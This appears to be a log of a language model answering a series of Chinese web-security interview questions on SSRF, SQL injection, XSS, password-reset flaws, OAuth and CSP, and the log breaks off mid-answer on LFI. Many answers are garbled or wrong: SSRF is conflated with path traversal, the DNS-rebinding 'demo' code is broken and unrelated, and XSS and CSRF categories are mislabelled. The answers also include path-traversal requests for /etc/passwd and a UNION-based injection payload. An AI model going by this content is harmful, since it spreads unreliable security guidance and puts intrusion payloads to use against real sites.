> 3. 谨慎处理跨域资源共享 (CORS) 策略设置：CORS 是一种允许不同源之间共享资源的技术规范，但如果不正确配置可能导致潜在的漏洞。开发者应该仔细考虑哪些资源可以被公开访问以及谁能够对其进行访问限制。
> 
> 4. 强制实施 HTTPS 协议：HTTPS 提供了加密通信通道，有助于避免中间人攻击和其他类型的篡改行为。建议所有敏感信息都应始终以 SSL/TLS 加密方式进行传输。
> 
> 5. 在前端代码层面添加防御性编程技巧：开发人员可以在前端脚本文件内加入随机数生成算法并在每个 AJAX 请求头中携带相关参数，以此提高黑客破解难度；还可以尝试在 URL 中增加时间戳参数等方式增强抵御能力。
> 
> 总之，要彻底杜绝 CS
> 
>  13%|████████                                                      | 12/93 [11:40<1:39:46, 73.91s/it]
> 
> 问题 SSRF 的成因及防御措施 
> 
> 网络上关于 SSRF（Server-Side Request Forgery）漏洞的文章有很多，但大都讲的是如何利用、危害和防范等技术层面的问题；而很少有从攻击者心理角度去剖析 SSRF 的本质原因，本文将尝试通过阐述 “为什么” 来解释什么是 SSRF 以及如何预防。
> 
> ** 一、先了解什么是 SSRF**
> 
> SSRF 是一种常见的安全缺陷，在 Web 应用中非常普遍。SSRF 指的是由于应用程序对用户输入数据验证不严或过滤不足导致的应用程序在响应客户端请求时可以发起跨站资源访问（CROSS-RESOURCE REQUEST FORGERY），从而泄露内部敏感信息或者执行未授权操作的一种远程代码执行方式。
> 
> 例如：当一个恶意的用户发送了包含目标 URL 地址的 POST 参数给你的网站后台管理接口时：
> 
> ```
> 
> GET /admin.php?cmd=getconfig HTTP/1.0
> 
> Host: www.target.com
> 
> # POST data (example)
> 
> {"host":"www.example.com","port":84,"path":"/etc/passwd"}
> 
> ```
> 
> 如果该系统存在 SSRF 漏洞，则会返回如下内容：
> 
> ```
> 
> HTTP/1.1 200 OK
> 
> Content-Type: text/html;charset=UTF-8
> 
> ...
> 
> <code><pre>root:x:0:0:</pre></code>
> 
> ```
> 
> 这里的 `http://www.example.com` 就是服务器端根据用户的请求生成并返回的数据。显然这种行为是不符合预期的，因为管理员只希望得到当前域名下的配置文件内容，而不是其他域中的内容。
> 
> 因此，“SSRF” 本质上是一个权限提升漏洞，它允许黑客控制应用程序的行为，使其能够以应用程序的身份获取不受信任的信息，如本地环境变量、内网主机名列表等等。
> 
> ** 二、为什么会发生 SSRF？**
> 
> 要理解这个问题，我们首先需要知道两种不同类型的 API 调用模式——简单 API 与复杂 API 的区别。
> 
> ## 简单 API
> 
> 这类 API 通常没有严格的安全限制，它们一般由以下几种情况构成：
> 
> * ** 使用绝对路径进行请求 ** ：比如直接指定某个图片的完整路径作为请求参数传递到后端处理函数中；
> 
> * ** 使用相对路径进行请求 ** ：虽然不会暴露绝对路径，但是可能还是会有风险，例如一些框架默认情况下支持 `.php` 扩展，那么当传入类似 `../include/config.php` 的值的时候就会出现潜在的风险。
> 
> 举个例子，假设我们的后台接口为 `/api/getConfig.php`，且没有任何有效的身份认证机制的情况下，我们可以构造如下 payload：
> 
> ```bash
> 
> POST /getconfig.php HTTP/1.1
> 
> Host: localhost
> 
> ...
> 
> # POST body (example)
> 
> {"host":"../../../../../../var/www/html/etc/passwd"}
> 
> ```
> 
> 这样就很容易触发目录遍历攻击。
> 
> ## 复杂 API
> 
> 相比于简单的 API 而言，复杂的 API 则会对用户提交的内容做更严格的检查，例如针对特殊字符、长度等方面的检测，同时也会考虑对特殊符号的转义处理。这些功能使得开发者们不必再担心上述提到的各种绕过方法所带来的安全隐患。
> 
> 然而即使如此，仍然有一些场景下容易产生 SSRF 漏洞，这主要是因为部分开发人员未能正确地实现安全编码规范所造成的。
> 
> 对于此类 API 调用过程来说，我们需要关注两个方面：
> 
>     * 对于 GET 请求，是否可能存在越权读取？
> 
>     * 对于 POST/PATCH 等类型的操作，是否存在非法写入的可能性？
> 
> 下面我们分别来看一下这两种不同的情况。
> 
> ### GET 请求
> 
> #### 第一种情况 —— 使用特定格式进行查询
> 
> 某些 Web 应用为了方便用户检索信息，会在 URL 中添加额外的查询字符串（query string）。这个过程中，有些开发者会选择将其拼接至原始请求之后发出，而不对其进行任何校验工作。这就意味着只要攻击者构造出符合规则的有效负载即可完成任意位置的读取任务。
> 
> 例如：假设我们的后台接口 `/api/getConfig.php?id=3&name=test.txt%00/%2fetc%2fpasswd` ，其中 id 参数表示待获取数据编号，name 则指定了具体文件名称。如果我们把 payload 改造成下面的样子：
> 
> ```bash
> 
> GET /api/getConfig.php?id=-1%25%2e..%252fetc%252fpasswd%00/%2f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f.\ . .
> 
> ```
> 
> 此时，服务器将会按照原样输出对应的数据库内容，即包含敏感信息的部分。
> 
> 需要注意的是，这种方式并不适用于所有基于 GET 方式的 API 接口，如果你遇到的情况是这样的：
> 
> ```bash
> 
> GET /api/getConfig.php?a=b HTTP/1.1 Host: target.com
> 
> ...
> 
> ```
> 
> 那么你
> 
>  14%|████████▋                                                     | 13/93 [12:14<1:22:23, 61.79s/it]
> 
> 问题 SSRF 如何探测非 HTTP 协议
> 
> 当然，我会为你提供关于 SSRF（服务器端请求伪造）检测非 HTTP 协议的方法和步骤。
> 
> 1. 理解什么是 SSRF
> 
> - 服务端请求伪造 (Server-Side Request Forgery) 是一种攻击方式，在这种情况下，攻击者通过欺骗应用程序发送一个恶意的网络请求到另一个外部资源。
> 
> - 这种漏洞通常发生在当应用程序在响应用户输入时未正确验证或过滤 URL 地址的情况下。
> 
> 2. 检测非 HTTP 协议
> 
> - 非 HTTP 协议包括但不限于：HTTPS、FTP、SMTP 等常见的传输层安全协议以及各种二进制文件格式。
> 
> - 在进行 SSRF 分析的时候需要了解这些常见协议及其相关参数, 如域名、路径、端口号等等。
> 
> 3. 使用工具辅助
> 
> - 利用自动化扫描工具如 ZAP 或 OWASP 安全测试平台来自动发现潜在的 SSRF 漏洞。
> 
> - 许多自动化工具都支持对不同类型的协议和服务的枚举功能，可以帮助我们快速定位可能存在的 SSRF 漏洞点。
> 
> 4. 手动检查代码逻辑
> 
> - 对于无法使用自动化工具检测到的情况，我们需要手动查看源码并理解其工作原理。
> 
> - 特别关注与用户输入相关的函数 / 方法，确保它们没有直接将未经处理的数据用于发出新的请求。
> 
> 5. 实验场景搭建
> 
> - 构建实验环境以模拟实际应用中可能出现的不同情况下的 SSRF 攻击场景。
> 
> - 尽量涵盖所有可能的服务类型及通信模式，例如 Web 应用程序、API 接口、数据库连接等。
> 
> 6. 测试案例编写
> 
> - 编写特定的测试用例，针对不同的协议和服务进行测试。
> 
> - 同样重要的是要创建正则表达式或其他匹配规则，以便有效地识别和报告 SSRF 漏洞。
> 
> 7. 结合其他技术手段
> 
> - 聚焦目标系统上运行的所有组件，结合日志审计、流量监控等方式，帮助我们更全面地了解整个系统的状态。
> 
> - 可能存在的一些隐蔽性较高的 SSRF 漏洞可以通过这种方式被挖掘出来。
> 
> 总之，对于 SSRF 的检测过程是一个复杂且细致的过程，涉及到多个方面因素和技术细节。建议您根据实际情况选择合适的方案，同时不断学习和更新自己的知识库。
> 
>  15%|█████████▎                                                    | 14/93 [12:42<1:07:59, 51.64s/it]
> 
> 问题 简述一下 SSRF 的绕过手法
> 
> 好的，我会尽力详细回答你的问题。
> 
> 首先，什么是 SSRF（Server-Side Request Forgery）？它是一种攻击技术，利用应用程序在处理用户请求时对服务器端资源发起未经授权的访问和操作。
> 
> SSRF 通常发生在需要向特定目标发出网络请求的应用程序中，在这些应用程序中，由于缺少有效的输入验证或过滤机制，攻击者可以构造恶意请求来欺骗应用程序将外部地址解析为内部 IP 地址或者 URL，从而导致数据泄露、命令执行等安全风险的发生。
> 
> 以下是一些常见的 SSRF 绕过的技巧：
> 
> 1. 利用绝对路径：通过使用绝对路径而不是相对路径，攻击者可以直接指定远程主机上的文件或目录，如 `/etc/passwd` 或 `http://example.com/foo.txt`，而无需依赖于其他域名的解析结果。
> 
> 2. 使用本地代理：如果应用程序支持使用本地代理进行通信，则可以通过设置 HTTP 代理为本机 IP 地址并提供一个指向目标网站的有效负载，以达到绕过限制的目的。
> 
> 3. 端口扫描：尝试不同的端口号组合，例如从 80 到 445 之间不断变化，可能会触发不同类型的响应内容，从而发现潜在的目标系统和服务。
> 
> 4. 同源策略：同源策略是浏览器的一个安全性功能，用于防止跨域脚本 (XSS) 漏洞的滥用。一些应用可能没有正确配置同源策略，允许来自同一子域的不同页面共享相同的 Cookie 或其他敏感信息，这可能导致 SSRF 攻击的成功率提高。
> 
> 请注意，以上仅列举了一些常见的绕过方法，实际情况下可能存在更多的变种和组合方式。为了更好地防御此类攻击，建议开发人员加强代码审计与测试，确保所有输入都经过严格的校验和过滤；同时，应遵循最佳实践原则，采用 HTTPS 协议传输敏感数据，避免直接暴露关键服务的端点地址。
> 
>  16%|██████████                                                    | 15/93 [13:18<1:00:56, 46.87s/it]
> 
> 问题 简述一下 SSRF 中 DNSRebind 的绕过原理及修复方法
> 
> ssrf 在 dns rebinding 攻击中的利用场景
> 
> 当服务器对客户端请求进行解析时，会先尝试使用本地域名系统（DNS）查询目标主机名或 IP 地址。
> 
> 如果目标主机名不存在于本地区域名称空间内，则会向远程 DNS 服务发起一个递归查询来获取该主机信息。
> 
> 这种情况下，如果用户可以通过发送精心构造的数据包欺骗应用程序将恶意 IP 地址绑定到合法的域名上，那么就可能触发 DNS Rebinding 攻击。
> 
> ## 演示代码：
> 
> ```python
> 
> import requests, socket, urllib.parse
> 
> def dns_rebind(target):
> 
>     # 尝试伪造本地 hosts 文件
> 
>     with open("/etc/hosts", "w") as f:
> 
>         f.write(f"127.0.0.1 {target}\n")
> 
>     print("local domain name:", target)
> 
>     # 构造 URL 并尝试访问
> 
>     url = "http://" + target + "/index.php"
> 
>     try:
> 
>         r = requests.get(url=url,
> 
>                         allow_redirects=False)        
> 
>         if r.status_code == 200 and len(r.text.strip()) > 3:
> 
>             return True
> 
>         else:
> 
>             return False
> 
>     except Exception as e:
> 
>         pass
> 
> # 测试是否可以成功反弹回源站
> 
> if __name__ == '__main__':
> 
>     for i in range(5):
> 
>         ip = str(socket.gethostbyname(i))
> 
>         result = dns_rebind(ip)
> 
>         if not result:
> 
>             break
> 
> ```
> 
> 在这个例子中，我们首先尝试修改本地 hosts 文件以映射指定的 IP 到特定的目标网站（如 `example.com`) ，然后尝试通过构造带有目标 IP 的 HTTP 请求来进行测试。如果返回响应状态码为 200，并且页面内容大于三个字节，则表示攻击已成功执行并从源站点反弹了数据包。
> 
> 注意：本例演示的是针对 Linux 系统上的 SSRF / DNS Rebinding 攻击，但其他操作系统也可能存在类似漏洞和相应的解决方案。
> 
> 对于此类攻击的有效防御措施包括：
> 
> - 在生产环境中禁用本地 `hosts` 文件；
> 
> - 使用防火墙限制网络端口之间的通信范围；
> 
> - 对外部输入进行严格的验证与过滤； 
> 
> - 加密敏感数据传输过程，避免中间人攻击等。
> 
>  17%|███████████                                                     | 16/93 [14:00<58:15, 45.39s/it]
> 
> 问题 介绍 SQL 注入漏洞成因，如何防范？注入方式有哪些？除了拖取数据库数据，利用方式还有哪些？
> 
> SQL Injection（SQLi）是目前最为常见的网络攻击之一，在黑客技术中也属于比较基础的一种。
> 
> 简单来说就是通过构造特殊的输入来欺骗应用程序将恶意代码作为 SQL 查询的一部分执行。
> 
> 举个例子：
> 
> ```
> 
> GET /index.php?id=12345 HTTP/1.1
> 
> Host: example.com
> 
> --sql-inject
> 
> id=-1 union select 0,username,password--
> 
> ```
> 
> 上面这段请求可以理解为 `example.com/index.php?&id=12345 UNION SELECT 0,username,md5(password)--`
> 
> 当这个链接被访问时，服务器会把 `id=12345 UNION SELECT 0,username,md5(password)` 当成一条有效的语句去解析并返回结果集给客户端。
> 
> 当然在实际环境中可能没有这么明显，但原理都是一样的：用户可控的数据和不可控的数据混合在一起传给了后端处理程序进行拼接、过滤再交给数据库去执行，导致了安全风险的发生。
> 
> ** 造成这种安全风险的原因主要有以下几点 **
> 
> - 输入验证不严或缺失：未对用户提供的参数做严格校验与转义操作就直接使用。
> 
> - 参数动态绑定：未根据预定义好的结构体去匹配用户输入中的每个字段值，而是由前端系统自行判断从哪里读到什么内容然后插入到对应的位置上。（比如 POST 提交的内容格式如下：`{"name":"John","age":28,"city":"New York"}`）
> 
> - 非预期输出：某些情况下，由于错误配置或者设计缺陷等缘故，即使存在 SQL 注入漏洞也无法成功执行命令获取敏感信息，但是却能以某种形式泄露一些其他有价值的信息出来，从而间接造成了危害。
> 
> 那么针对以上三种情况我们可以采取相应的措施来进行防御：
> 
> 对于第一种情况而言，最简单的解决办法就是在关键位置增加必要的转义符号防止特殊字符逃逸出原本应该起作用的地方；如果条件允许的话也可以考虑引入专门用来检测非法输入的方法库如 [OWASP ESAPI](https://www.owasp.org/index.php/ESAPI) 之类的东西帮助自己提升防护能力。
> 
> 第二种方案则是建议开发者们不要随意更改系统的默认行为以及做好类型转换工作确保所有外部输入都能正确地映射回内部所需的形式再去进一步加工生成最终想要呈现出来的样子以免因为误用而导致不必要的麻烦发生。
> 
> 最后一种情况则需要结合具体业务逻辑及实现流程仔细排查是否存在能够绕过前面两层限制机制而暴露更多有用信息的行为出现然后再针对性地加以修补完善才行。
> 
> 总之要想真正杜绝 SQL 注入这类严重威胁信息安全级别的隐患就必须付出足够多的努力并且保持持续更新维护才能保证始终处于相对较高的安全水平线上面
> 
>  18%|███████████▋                                                    | 17/93 [14:29<51:18, 40.50s/it]
> 
> 问题 如何通过 sql 注入写 shell, 写 shell 的前提条件是什么?
> 
> SQL 注入漏洞是黑客入侵数据库系统常用的一种手段，其本质是在应用程序中未对用户输入的数据进行有效的过滤和验证而造成的安全威胁。
> 
> 在大多数情况下，攻击者利用 SQL 注入来获取敏感数据或执行未经授权的操作（如修改、删除数据）等恶意行为。下面是一些常见的方法：
> 
> 1. 利用盲注：使用基于布尔逻辑的查询语句来探测特定字段是否存在，例如 `SELECT 1 WHERE (user_name='admin' OR 'a')`，如果返回结果为真，则说明存在该用户名；反之则不存在。可以尝试构造各种组合的字符串来进行测试。
> 
> 2. 构造有效负载：根据目标网站的具体情况设计合适的 payload 来触发 SQL 注入漏洞。这需要深入了解所使用的编程语言及框架的特点以及相关的参数类型与限制规则。比如，在某些 Web 应用程序中，可能存在多个版本号参数拼接在一起的情况，可以通过将每个版本号之间添加单引号来实现读取文件内容的功能。
> 
> 3. 执行命令：一旦成功获得管理员权限或者访问到后台管理系统时，就可以考虑执行一些简单的操作以达到进一步渗透的目的了。通常来说，我们需要知道当前服务器上安装的一些实用工具及其路径信息才能顺利地完成此步骤。常用的有 Windows 上的 cmd.exe 或 Linux 下的各种 Shell 工具包。
> 
> 4. 配合其他技术：有时仅仅依靠单纯的 SQL 注入还不能直接控制整个应用系统的运行状态，这时就需要与其他技术相结合才能够更好地达成预期效果。比如说结合 XPATH 查询语法从 XML 文档中提取关键节点值作为下一步行动的基础依据等等。
> 
> 总之，想要掌握好 SQL 注入技巧并不容易，它需要我们具备扎实的计算机基础知识并熟悉相关开发环境才行。当然如果你已经掌握了这些技能并且正在寻找实战机会的话不妨去参加一些在线竞赛活动以便提升自己的技术水平哦！
> 
>  19%|████████████▍                                                   | 18/93 [15:03<48:22, 38.70s/it]
> 
> 问题 介绍一下 XSS 漏洞的种类，dom 型 XSS 和反射 XSS 的区别是什么?
> 
> 好的，我会为你详细解释一下不同类型的 xss 攻击及其区别。
> 
> 1. DOM XSS
> 
> DOM XSS（Document Object Model Cross-Site Scripting）是一种存储在本地浏览器中的跨站脚本攻击类型。
> 
> 这种形式的 xss 通常发生在应用程序中使用用户输入时未能正确过滤或转义 HTML 标签、属性以及特殊字符的情况下。由于这些内容是在客户端执行的，因此它可以在受害者访问受感染网页后立即触发并持续存在，即使他们关闭了受影响的页面。
> 
> 2. Reflected XSS
> 
> Reflected XSS（反射式跨站脚本攻击）是指当一个网站接收用户的输入并在不经过任何处理的情况下将该数据返回给用户的时候发生的 XSS 攻击。在这种情况下，攻击者可以通过构造恶意 URL 参数来注入恶意代码，在受害者的浏览器上执行，从而导致信息泄露或者控制被攻击的应用程序的行为。
> 
> 3. Blind XSS
> 
> Blind XSS 是另一种常见的 XSS 攻击方式，与 reflected XSS 类似但又有所不同。虽然盲注不会直接显示恶意脚本的结果，但是攻击者仍然可以利用此方法窃取敏感信息，例如 cookie 值等身份验证凭据。
> 
> 4. Stored XSS
> 
> Stored XSS（持久性跨站脚本攻击）是指通过向服务器发送请求插入特定的数据而造成的一种长期存在的安全威胁。一旦目标受到此类攻击，则其浏览历史记录或其他相关站点可能会受到影响。因为存储在数据库或缓存中的恶意脚本会在多个会话之间保持有效状态，所以需要定期更新软件以消除潜在的安全隐患。
> 
> 5. Open Redirects
> 
> Open redirects 指没有进行充分的身份验证就允许任意重定向到其他域名的情况。尽管这不是一种典型的 XSS 类型，但它常常与其他技术一起用于实施更复杂的网络钓鱼和其他欺骗行为。
> 
> 6. Sensitive Data Exposure
> 
> Sensitive data exposure（SDE），也称为 SDBD (Server-Driven Bypass) 是一种特殊的 XSS 攻击，其中攻击者能够绕过常规的防御机制并获取对系统内部敏感数据的访问权限。这通常是通过精心设计的有效负载，结合各种编码技巧实现的。
> 
> 总之，每种类型的 XSS 都有不同的特点和影响范围。了解它们之间的差异可以帮助您更好地理解如何预防和应对可能面临的风险。
> 
>  20%|█████████████                                                   | 19/93 [15:39<46:35, 37.78s/it]
> 
> 问题 如何防范 XSS 漏洞，在前端如何做，在后端如何做，哪里更好，为什么？
> 
> XSS（跨站脚本攻击）是一种常见的网络漏洞类型，它利用了应用程序未能正确过滤用户输入数据的问题来执行恶意操作。以下是一些在前端和后端预防 XSS 漏洞的方法：
> 
> ** 前端预防方法：**
> 
> 1. 输入验证与清理
> 
>    - 使用白名单进行输入验证并删除非法字符。
> 
>    - 对于特殊符号、单引号等敏感内容使用编码或转义处理。
> 
> 2. 输出转义
> 
>    - 在输出到页面之前对所有可控制的内容进行 HTML 实体编码。
> 
> 3. 内容安全策略 (CSP)
> 
>    - CSP 可以限制网页加载外部资源的能力，从而减少潜在的安全风险。
> 
> 4. 合理设置 HTTP 头部
> 
>    - 设置 "Content-Security-Policy-Base-uri" 以防止通过内嵌式资源引入有害代码。
> 
> 5. 严格模式 (Safe Mode) 启用
> 
>    - JavaScript 引擎通常支持 Safe mode，该模式会阻止一些可能导致安全问题的行为。
> 
> 6. Content-Disposition 头禁用
> 
>    - 禁止下载文件时自动打开浏览器中的预览功能。
> 
> 7. URL 参数黑名单
> 
>    - 不允许特定类型的 URL 参数作为响应的一部分返回给客户端。
> 
> 8. 预防反射型 XSS
> 
>    - 加强服务器端请求伪造 (Reflected Cross Site Scripting) 防护措施, 如添加验证码等机制。
> 
> 9. 安全检查工具
> 
>    - 使用自动化扫描器定期检测应用中可能存在的 XSS 漏洞。
> 
> ** 后端预防方法：**
> 
> 1. 输入验证与清理
> 
>    - 类似于前端实现的方式，确保从数据库或其他来源获取的数据经过适当的清洗和验证后再用于生成动态页面。
> 
> 2. 应用程序防火墙 (AWF)
> 
>    - AWF 可以帮助拦截潜在的 XSS 攻击尝试。
> 
> 3. SQL 注入防御
> 
>    - 建立严格的 SQL 查询语句过滤规则，包括禁止拼接用户提供的字符串。
> 
> 4. 参数化查询
> 
>    - 将用户的输入视为变量而非直接包含在 SQL 查询中。
> 
> 总之，无论是前端还是后端都需要采取一系列有效且合理的措施来预防 XSS 漏洞的发生。然而需要注意的是，这些技术并不能完全保证网站免受 XSS 攻击的影响。因此，建议结合多种技术和最佳实践来进行全面保护。
> 
>  22%|█████████████▊                                                  | 20/93 [16:19<46:57, 38.59s/it]
> 
> 问题 讲述一下找回密码可能涉及的逻辑漏洞
> 
> 好的，我会为你提供一个详细的回答。
> 
> 在用户尝试重置其帐户时，通常会执行以下步骤：
> 
> 1. 用户输入用户名或电子邮件地址
> 
> 2. 系统验证该账户是否存在并返回相应的响应（如 “用户名 / 邮箱已注册”）
> 
> 3. 如果系统检测到存在此账号，则要求用户提供新的登录凭证（通常是新密码）以完成重设过程
> 
> 4. 一旦确认新密码符合规则且未被使用过，系统将更新用户的密码信息并提示成功修改密码。
> 
> 在这个过程中可能存在一些常见的安全漏洞：
> 
> - ** 暴力破解 **：攻击者可以针对系统进行暴力破解尝试所有组合来获取正确的凭据。这可以通过自动化脚本、字典文件和多线程技术实现。为了防止这种情况发生，网站应该实施验证码机制、限制请求速率以及设置较长的有效期等措施。
> 
> - ** 跨站请求伪造 (CSRF)** ：如果用户通过点击恶意链接或访问不受信任的网站而触发了自动提交表单操作的话，那么就有可能受到 CSRF 攻击的影响。为避免此类风险，在设计重置密码流程中应确保包含有效的 CSRF 防御策略，例如添加 token 或检查来源 IP 地址等方法。
> 
> - ** 钓鱼攻击 ** : 攻击者可能会发送欺诈性的电子邮件给目标用户，声称需要更改他们的密码。这些邮件看起来像来自合法机构，但实际上它们是欺骗性地引导受害者进入虚假的页面。因此，重要的是要对域名和 URL 进行严格的验证和过滤，同时提醒用户警惕可疑的链接和附件。
> 
> - ** 错误消息泄露 ** ：某些情况下，当用户未能正确填写表单字段时，应用程序可能会显示有关他们失败原因的信息。但是，有些开发者没有充分考虑敏感数据保护的问题，导致泄漏关键信息，比如暴露用户名是否存在于数据库中的详细日志记录。为了避免这种潜在的安全隐患，建议开发人员仅向用户提供必要的反馈信息，不要过多透露关于具体错误的原因及细节内容。
> 
> - ** 弱口令生成器 ** : 在创建强密码方面，许多用户仍然依赖于简单的模式和易于猜测的方法。由于许多网站允许多次尝试输入相同的旧密码作为新密码，所以利用这个特性很容易绕过复杂度较高的加密算法。一种解决方案是在服务器端强制应用更强大的哈希函数和盐值处理方式，这样即使相同明文对应不同散列结果也可以有效阻止暴力破解行为的发生。
> 
> 综上所述，尽管每种类型的漏洞都具有特定的风险特征与影响范围，但全面了解整个业务场景并且采取适当防御措施可以帮助您更好地抵御各种网络威胁。
> 
>  23%|██████████████▍                                                 | 21/93 [16:44<41:15, 34.39s/it]
> 
> 问题 假设你是甲方的一名安全工程师，应该如何降低逻辑漏洞的出现率?
> 
> 作为一名资深的安全工程师，在降低甲方公司中的逻辑漏洞出现率方面可以采取以下措施：
> 
> 1. 深入了解业务流程和系统架构：对公司的整体业务、信息系统进行深入调研与评估，掌握其功能模块及数据流关系。
> 
> 2. 制定规范化的开发流程：建立一套标准化的软件开发过程（SDLC），包括需求收集、设计评审、编码实现、测试验证等环节，并制定相应的质量控制标准。
> 
> 3. 强化代码审计工作：在项目实施过程中加强源码审核力度，针对关键部分或存在潜在风险的部分进行重点检查，确保代码符合相关安全要求并减少潜在的逻辑缺陷。
> 
> 4. 进行常规性的安全培训：定期组织内部员工参加相关的技术培训课程，提高他们对于常见攻击手段的理解能力以及防范意识；同时也可以邀请外部专业人员开展针对性强的技术讲座活动。
> 
> 5. 建立完善的应急响应机制：针对可能出现的各种突发情况做好预案准备, 明确各部门职责分工，并且落实到实际操作中去; 一旦发现异常事件及时上报处理避免造成更大的损失.
> 
> 6. 定期进行渗透测试演练：通过模拟黑客入侵行为来检验系统的安全性，发现问题后立即修复整改以防止真实攻击发生时产生重大影响。
> 
> 7. 加强第三方服务管理：严格把控合作方资质认证、合同签订、信息保密等方面内容，从源头上杜绝可能存在的安全隐患。
> 
> 8. 不断更新维护已上线应用系统：随着新技术的发展不断推出新的防御工具和技术方案，需要保持敏锐感知力随时跟进最新动态并对己有产品进行升级优化
> 
>  24%|███████████████▏                                                | 22/93 [17:19<40:47, 34.47s/it]
> 
> 问题 oauth 认证过程中可能会出现什么问题，导致什么样的漏洞?
> 
> OAuth（开放授权）是一种用于确认用户身份并获取有限访问权限的安全协议。
> 
> 由于它允许第三方应用在不泄露用户的用户名和密码的情况下获得对特定资源和服务的访问权，因此广泛应用于社交网络、电子邮件和其他在线服务中。
> 
> 然而，在实际使用过程中，如果开发者没有正确地实施 OAuth，则可能产生以下安全风险：
> 
> 1. ** 双重授权 **：攻击者可以利用应用程序中的错误配置或代码缺陷来绕过 OAuth 的身份验证过程，从而无需经过合法用户提供许可即可访问其账户信息或其他敏感数据。
> 
> 2. ** 会话固定 **：当一个客户端向服务器发送请求时，通常需要提供一些凭据进行身份验证。攻击者可以通过截获这些凭证并在后续操作中重用它们来进行未经授权的操作。这种行为称为 “会话固定”，可能导致对受影响系统内的其他账户执行恶意活动。
> 
> 3. ** 钓鱼欺诈 **：攻击者可以在网站上创建与真实目标相似但伪造的服务端点 URL，诱使受害者输入他们的登录凭据以完成 OAuth 流程。一旦受害者的证书被提交给欺骗性的 URL，攻击者就可以将窃取的数据直接注入到自己的系统中，而不需要通过 OAuth 的过程进行验证。
> 
> 4. **XSS / CSRF 攻击 **：在某些情况下，开发人员未能充分保护关键参数如令牌、回调 URI 等免受跨站脚本 (XSS) 和 CSRF(点击劫持)攻击的影响。这使得黑客能够滥用这些功能，并在未经适当授权的情况下操纵受影响的应用程序的行为。
> 
> 5. ** 未加密通信 **：虽然 OAuth 要求所有传输内容必须是 HTTPS，但在实践中仍然存在许多未正确实现这一标准的情况。这意味着敏感信息, 如访问令牌和会话密钥，仍有可能在网络上传输时不加任何保护措施，从而使中间人 (MITM) 攻击成为可能。
> 
> 6. **API 密钥泄漏 ** ：有些 OAuth API 供应商允许应用程序公开暴露其 API 密钥。若该密钥被发现或猜测出来，则攻击者可借此调用指定的 API 接口，进而控制相关帐户，甚至发起进一步的 DDoS 攻击或其它更严重的威胁。
> 
> 总之，要避免上述潜在的风险，开发团队应该仔细遵循 OAuth 规范以及相关的最佳实践建议，确保他们所构建的所有组件都得到适当的测试和审计。
> 
>  25%|███████████████▊                                                | 23/93 [17:58<41:47, 35.82s/it]
> 
> 问题 CSP 应该如何使用及配置，有哪些绕过 CSP 的方式
> 
> 好的，我会尽力回答你的问题。
> 
> 首先让我们先了解一下什么是 Content Security Policy（内容安全策略）。
> 
> CSP 是一种在 Web 浏览器中实现的安全功能，它允许网站管理员指定哪些资源可以加载到页面上以及如何执行这些操作。通过实施 CSP，您可以控制您的网页从哪里获取资源、运行脚本或执行其他活动的能力，从而帮助减少 XSS 和 CSRF 等攻击的风险并提高安全性。
> 
> 以下是关于如何正确地使用和配置 CSP 的基本步骤：
> 
> 1. 确定要保护的内容：您需要确定要在站点上进行限制的所有类型的内容，包括图像、视频、音频文件和其他类型的媒体元素。这可以帮助您更好地了解应该对哪些域设置规则以确保所有敏感信息都受到适当的保护。
> 
> 2. 配置 CSP 头部：一旦你知道了你要保护的内容，你需要为每个域名创建一个 CSP 头部，告诉浏览器哪些来源是可信的并且允许它们访问特定的内容。例如：
> 
> ```html
> 
> <meta http-equiv="Content-Security-Policy" content="default-src'self'; img-src data:,example.com; script-src example.com">
> 
> ```
> 
> 上面的例子显示了一个简单的 CSP 头部，其中定义了默认源为 “自己”，图片可以从数据 URI 和 example.com 加载，而 JavaScript 代码只能来自 example.com。
> 
> 3. 测试和验证：在将 CSP 应用于生产环境之前，在开发环境中测试 CSP 的有效性非常重要。建议使用工具如 csp-evaluator 来检查是否符合标准并提供有关潜在漏洞的信息。
> 
> 4. 更新与维护：随着网络应用程序的发展和技术的变化，您可能需要定期更新 CSP 头部以适应新的需求和风险。请记住始终遵循最佳实践并在必要时咨询专业人员的意见。
> 
> 至于绕过 CSP 的方法，虽然有多种方法，但大多数都需要深入的技术知识才能成功实施。以下是一些常见的尝试绕过 CSP 的行为:
> 
> - 直接修改 HTTP 响应头中的 CSP 字段；
> 
> - 使用不支持的功能或 API；
> 
> - 通过更改 URL 编码方案等方式欺骗服务器；
> 
> - 在 HTML 文档中直接嵌入不受信任的资源；
> 
> 需要注意的是，绕过 CSP 通常涉及更深层次的问题，如弱身份认证机制、未经充分授权的数据访问或其他弱点。因此，如果您发现任何可疑行为，请立即报告给相关团队以便他们采取必要的措施修复这些问题。
> 
> 总之，CSP 是一个强大的安全特性，但它不能完全消除安全威胁。为了最大程度地利用其优势，必须谨慎选择白名单资源并通过不断测试和更新保持最新状态。
> 
>  26%|████████████████▌                                               | 24/93 [18:24<38:04, 33.10s/it]
> 
> 问题 已知某网站存在 LFI(本地文件包含)，但是无法上传任何文件，针对该情况有哪些利用方式?
> 
> 在目标系统中使用本地文件包含（LFI）漏洞时，攻击者可以获取敏感信息或执行未经授权的操作。
> 
> 虽然您不能直接上传文件到受影响的服务器上，但您可以尝试以下几种方法来利用此漏洞：
> 
